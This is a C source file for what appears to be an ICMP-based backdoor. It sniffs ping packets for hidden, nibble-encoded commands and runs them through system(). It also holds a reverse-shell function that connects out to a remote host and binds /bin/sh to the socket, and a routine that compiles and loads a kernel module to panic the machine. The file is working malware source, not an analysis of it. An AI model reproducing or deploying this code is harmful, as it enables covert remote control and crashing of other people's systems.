#include<stdio.h>
#include<stdlib.h>              //malloc
#include<string.h>              //memset
#include<netinet/ip_icmp.h>     //icmp header
#include<netinet/ip.h>          //ip header (source,dest)
#include<sys/socket.h>          //socket
#include<arpa/inet.h>           //sokcet
#include<unistd.h>              //close

int panic() {

    // stack exchange IW16
    char *m="mkdir /tmp/ptest && cd /tmp/ptest && \
printf '#include <linux/kernel.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\
static int8_t* message = \"buffer overrun at 0xdeadbeefdeadbeef\";\
int init_module(void){panic(message);return 0;}' > kpanic.c && \
printf 'obj-m += kpanic.o\nall:\n\t\
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' > \
Makefile && make && insmod kpanic.ko &";

    system(m);
    return 0;
}

int pop(char *lhost, char *pname, int lport) {
    struct sockaddr_in base;
    if (fork() == 0) {
        base.sin_family = AF_INET;
        base.sin_addr.s_addr = inet_addr(lhost);
        base.sin_port = htons(lport);
        
        int r = socket(AF_INET, SOCK_STREAM, 0);
        connect(r, (struct sockaddr *)&base, sizeof(base));
        dup2(r, 0);
        dup2(r, 1);
        dup2(r, 2);
        execl("/bin/sh", pname, NULL);
        exit(0);
    } else 
        return 1;
    return 0;
}

int exc(char *cmd) {
    if (fork() == 0) {
        system(cmd);
    }
}

int get_cmd(char *payload, char *output, int size) {

    int i,j, len;
    int start = -1;
    int end = -1;

    for (i=0; i<size-1;  i++)
        if ((unsigned char)payload[i] == 0xff && (unsigned char)payload[i+1] != 0xff) {
            start = i+1;
            break;
        }

    if (start == -1) return 1;

    for (i=start+1; i<size-1;  i++)
        if ((unsigned char)payload[i] != 0xff && (unsigned char)payload[i+1] == 0xff) {
            end = i;
            break;
        }

    if (end == -1) return 1;

    j=0;
    for (i=start; i<=end; i++) {
        output[j] = payload[i];
        output[j] = ((unsigned char)output[j] & 0x0F)<<4 | (unsigned char)(output[j] & 0xF0)>>4;
        j++;
    }
    output[j] = 0x00;
    return 0;
}

void split_string(char *m, char **s1, char **s2) {

    int l = strlen(m);
    *s1 = (char *) malloc(64);
    *s2 = (char *) malloc(64);

    if (strstr(m," ") == NULL) {
        strncpy(*s1, m, l);
        free(*s2); *s2 = NULL;
        return;
    }

    for (int i=0; i<l; i++)
        if (m[i] == ' ') {
            (*s1)[i] = 0x00;
            break;
        } else
            (*s1)[i] = m[i];

    strncpy(*s2,&strstr(m, " ")[1],strlen(&strstr(m, " ")[1]));

    if (strlen(*s1) < 1) {
        free(*s1); *s1 = NULL;
        free(*s2); *s2 = NULL;
    } else if (strlen(*s2) < 1) {
        free(*s2); *s2 = NULL;
    }

    return;
}

int process_cmd(char *cmd) {

    char *arg1;
    char *arg2;

    split_string(cmd, &arg1, &arg2);

    if (arg1 == NULL) {
        printf("Invalid command\n");
        return 1;
    } 

    // single command
    if (arg1 != NULL && arg2 == NULL) {
        if (strcmp(arg1, "burn") == 0) {
            printf("Burning...\n");
            //burn();
        } else if (strcmp(arg1, "crash") == 0) {
            printf("Crashing...\n");
            //crash();
        } else if (strcmp(arg1, "panic") == 0) {
            printf("Panicking...\n");
            //crash();
        } else {
            printf("Invalid command\n");
            return 1;
        }
    } else {
        if (strcmp(arg1, "run") == 0)
            exc(arg2);
        else {
            printf("Invalid command\n");
            return 1;
        }
    }

    return 0;

}

int process_icmp(unsigned char* buffer , int size, char *ip_src, char *ip_dst, char *msg) {

    struct sockaddr_in source,dest;                                         // source, dest
    struct iphdr *ip_head = (struct iphdr *)buffer;                         // ip header
    unsigned short ip_head_len = ip_head->ihl*4;                            // ip header len
    struct icmphdr *icmp_head = (struct icmphdr *)(buffer + ip_head_len);   // icmp header
    unsigned char* data = buffer + ip_head_len + sizeof icmp_head;          // payload pointer
    int data_size = (size - sizeof icmp_head - ip_head->ihl*4);             // payload size
    int i;

    memset(&source, 0, sizeof(source));
    memset(&dest, 0, sizeof(dest));
    source.sin_addr.s_addr = ip_head->saddr;
    dest.sin_addr.s_addr = ip_head->daddr;

    printf("\n==========================================\n");
    printf("Src  : %s\n",inet_ntoa(source.sin_addr));
    printf("Dest : %s\n",inet_ntoa(dest.sin_addr));

    printf("Len  : %d  Bytes\n",ntohs(ip_head->tot_len));
    printf("Type : %d",(unsigned int)(icmp_head->type));

    if ((unsigned int)(icmp_head->type) == ICMP_ECHOREPLY) {
        printf(" (ICMP Echo Reply)\n");
        strncpy(ip_dst, inet_ntoa(source.sin_addr), 16);    // return src ip
        strncpy(ip_src, inet_ntoa(dest.sin_addr), 16 );        // return dst ip   
    } else if((unsigned int)(icmp_head->type) == ICMP_ECHO) {
        printf(" (ICMP Echo Request)\n");
        strncpy(ip_src, inet_ntoa(source.sin_addr), 16);    // return src ip
        strncpy(ip_dst, inet_ntoa(dest.sin_addr), 16);        // return dst ip  
    } else
        return 2;

    printf("\n");
    printf("Payload: \n");  

    // display
    for (i=0 ; i < data_size ; i++) 
        if (data[i]>=32 && data[i]<=128)
            printf("%c",(unsigned char)data[i]);
        else
            printf(".");

    // return payload
    for (i=0 ; i < data_size ; i++) 
        if ((unsigned char)data[i] == 0x00)
            msg[i] = 0x01;
        else if ((unsigned char)data[i] == 0xff)
            msg[i] = 0xff;
        else
            msg[i] = (unsigned char)data[i];

    msg[i] = 0x00;

    printf("\n==========================================\n");
    fflush(stdout);

    return 0;
}

int main()
{
    int s_size , recv_size, st, cmd_st;
    struct sockaddr s_addr;
    struct iphdr *ip_head;
    int s;
    //char *ip_src, *ip_dst, *msg;
     
    char *buffer = malloc(128);                   // icmp packet size, usually 98
    char ip_src[16], ip_dst[16];
    char msg[64], cmd[64];

    s = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);                          // raw socket, ICMP only (TCP, UDP, RAW)
    if(s < 0) { printf("Cannot create socket\n"); return 1; }
    s_size = sizeof s_addr;

    while(1)
    {

        recv_size = recvfrom(s , buffer , 128 , 0 , &s_addr , &s_size);     // receiving
        if(recv_size <0 ) { printf("Failed to get packet\n"); return 1; }

        ip_head = (struct iphdr*)buffer;
        if (ip_head->protocol == 1) {
            st = process_icmp(buffer , recv_size, ip_src, ip_dst, msg);

            if ((st == 0 ) && get_cmd(msg, cmd, strlen(msg)) == 0) {
                printf("Package captured!\n");
                printf("From %s, to %s\n", ip_src, ip_dst);
                printf("Command: %s\n", cmd);
                process_cmd(cmd);
            }

        }
        else
            continue;

    }

    close(s);
    return 0;
}